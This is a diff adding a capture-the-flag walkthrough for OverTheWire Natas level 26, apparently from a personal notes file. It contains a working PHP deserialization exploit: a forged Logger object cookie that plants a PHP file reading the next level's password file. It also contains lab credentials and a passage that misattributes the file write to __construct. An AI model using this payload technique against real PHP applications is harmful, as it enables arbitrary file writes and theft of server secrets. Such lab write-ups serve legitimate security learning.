@@ -1748,3 +1748,185 @@ Change `User-Agent` header to: `<?php echo file_get_contents("/etc/natas_webpass
 
 ### natas26
 
+```php
+<?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
+    
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+      
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+      
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }                       
+      
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }                       
+      
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }                       
+    }
+ 
+    function showImage($filename){
+        if(file_exists($filename))
+            echo "<img src=\"$filename\">";
+    }
+
+    function drawImage($filename){
+        $img=imagecreatetruecolor(400,300);
+        drawFromUserdata($img);
+        imagepng($img,$filename);     
+        imagedestroy($img);
+    }
+    
+    function drawFromUserdata($img){
+        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+        
+            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+            imageline($img,$_GET["x1"], $_GET["y1"], 
+                            $_GET["x2"], $_GET["y2"], $color);
+        }
+        
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists("x1", $object) && 
+                        array_key_exists("y1", $object) &&
+                        array_key_exists("x2", $object) && 
+                        array_key_exists("y2", $object)){
+                    
+                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                        imageline($img,$object["x1"],$object["y1"],
+                                $object["x2"] ,$object["y2"] ,$color);
+            
+                    }
+        }    
+    }
+    
+    function storeData(){
+        $new_object=array();
+
+        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+            $new_object["x1"]=$_GET["x1"];
+            $new_object["y1"]=$_GET["y1"];
+            $new_object["x2"]=$_GET["x2"];
+            $new_object["y2"]=$_GET["y2"];
+        }
+        
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+        }
+        else{
+            // create new array
+            $drawing=array();
+        }
+        
+        $drawing[]=$new_object;
+        setcookie("drawing",base64_encode(serialize($drawing)));
+    }
+?>
+
+<?php
+    session_start();
+
+    if (array_key_exists("drawing", $_COOKIE) ||
+        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
+        $imgfile="img/natas26_" . session_id() .".png"; 
+        drawImage($imgfile); 
+        showImage($imgfile);
+        storeData();
+    }
+    
+?>
+```
+
+Try `POST` form with random `X1`, `X2`, `X3`, `X4` value, get the response:
+
+```
+Host: natas26.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://natas26.natas.labs.overthewire.org/
+Authorization: Basic bmF0YXMyNjpvR2dXQUo3emNHVDI4dllhekdvNHJraE9QRGhCdTM0VA==
+Connection: keep-alive
+Cookie: __utma=176859643.1954634464.1645363414.1646503128.1646533829.12; __utmz=176859643.1646533829.12.8.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); PHPSESSID=qkur9poeu2jlnno2nko2rbk937; drawing=YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjEwIjtzOjI6InkyIjtzOjI6IjEwIjt9fQ%3D%3D
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+```
+
+Explore the cookie:
+
+`drawing=YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjEwIjtzOjI6InkyIjtzOjI6IjEwIjt9fQ%3D%3D`
+
+In source code, the cookie `drawing` is set by `setcookie("drawing",base64_encode(serialize($drawing)));`. Ok, we can unserialize it.
+
+First, base_64 decode:
+
+`a:1:{i:0;a:4:{s:2:"x1";s:2:"10";s:2:"y1";s:2:"10";s:2:"x2";s:2:"10";s:2:"y2";s:2:"10";}}`
+
+Then, unserialize:
+
+` Array ( [0] => Array ( [x1] => 10 [y1] => 10 [x2] => 10 [y2] => 10 ) ) `
+
+In source code, the class `Logger` do not used. Now we create `Logger` object by `natas26.php`, next serialize and base64 encode, then inject to cookie.
+
+```php
+<?php
+// natas26.php
+class Logger
+{
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+    function __construct()
+    {
+        // initialise variables
+        $this->initMsg="BEGIN PASSWORD \n";
+        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27');?> \n END PASSWORD";
+        $this->logFile = "img/test.php";
+    }
+}
+$object = new Logger();
+echo base64_encode(serialize($object));
+?>
+```
+
+The above codes creates an object of class `Logger`. Creation of an object sends a call to `__construct()` function which executes our command and stores the result in img/test.php file.
+
+```shell
+php natas26.php
+
+Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Rlc3QucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MTY6IkJFR0lOIFBBU1NXT1JEIAoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo3NjoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTs/PiAKIEVORCBQQVNTV09SRCI7fQ==
+```
+
+Change cookie `drawing=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Rlc3QucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MTY6IkJFR0lOIFBBU1NXT1JEIAoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo3NjoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTs/PiAKIEVORCBQQVNTV09SRCI7fQ==`
+
+Access to `http://natas26.natas.labs.overthewire.org/img/test.php` and get password:
+
+```
+55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ END PASSWORD
+```
